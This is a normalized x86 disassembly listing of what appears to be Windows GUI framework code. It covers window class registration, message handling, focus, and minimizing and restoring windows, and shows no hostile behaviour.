mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42afac
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42b37c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_469db8
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c644
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_469818
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c66c
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4088a8
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404128
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_469f94
mov eax ebx
call sub_46a958
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_468250
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_468131
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_46a968
mov [ esp + 0x4 ] esi
mov [ esp ] sub_469620
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_469818
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46a1b4
xor edx edx
mov eax esi
call sub_469b30
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
push esi
push sub_468684
mov eax esi
call sub_46940c
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057b4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403128
mov eax [ esi + 0x90 ]
call sub_403128
mov eax [ esi + 0x98 ]
call sub_403128
test bl bl
jle r-xdata
call sub_421e74
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_468250
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4683f1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4683f8
lea eax [ ebp - 0x2c ]
call sub_403eb8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_4687d0
call sub_421ddc
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404378
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406c10
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403eb8
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_468ed4
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_468ed4
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_468400
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_467090
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_468460
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4185a4
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_44f7d8
cmp ebx eax
je r-xdata
sub_4684d0
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_468460
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418700
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4685e8
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418700
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_468684
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c90c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4675e4
mov eax [ rw-data ]
call sub_467c2c
sub_4686dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468739
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468740
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_4040b0
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_468748
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_468784
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_468ed4
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_4687d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403608#9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_468684
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4698f0
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_418700
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_44f7d8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46a81c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46940c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4693b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_468ed4
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_467c2c
push ebp
call sub_468748
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_468748
pop ecx
jmp [ eax * 4 + jump_table_468874 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_44f7d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469288
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454180
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4686dc
push ebp
call sub_468748
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_468748
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_468748
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420b98
jmp r-xdata
xor eax eax
call sub_460528
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_44f7d8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44a198
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_468ef0
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_468748
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_465de4
jmp r-xdata
push ebp
call sub_468748
pop ecx
jmp r-xdata
push ebp
call sub_468784
pop ecx
jmp r-xdata
push ebp
call sub_468748
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4685e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_468fa0
jmp r-xdata
jmp r-xdata
call sub_43c760
call sub_43c840
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4685d8
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4685e8
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4685e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4603d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_468748
pop ecx
jmp r-xdata
call sub_46048c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_468748
pop ecx
jmp r-xdata
call sub_43c760
call sub_43c89c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d3e8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_468ef0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4685d8
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_467eac
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_44f7d8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_468fa0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_467eac
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_4685e8
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_44f7d8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_463b70
mov eax [ ebx + 0x44 ]
call sub_465f8c
sub_4690a0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4690dc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403f0c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403fa8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_469128
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46914c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46919c
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_445e0c
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_44f7d8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_469254
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46a1b4
sub_469288
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403324
test al al
jne r-xdata
sub_4692f4
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
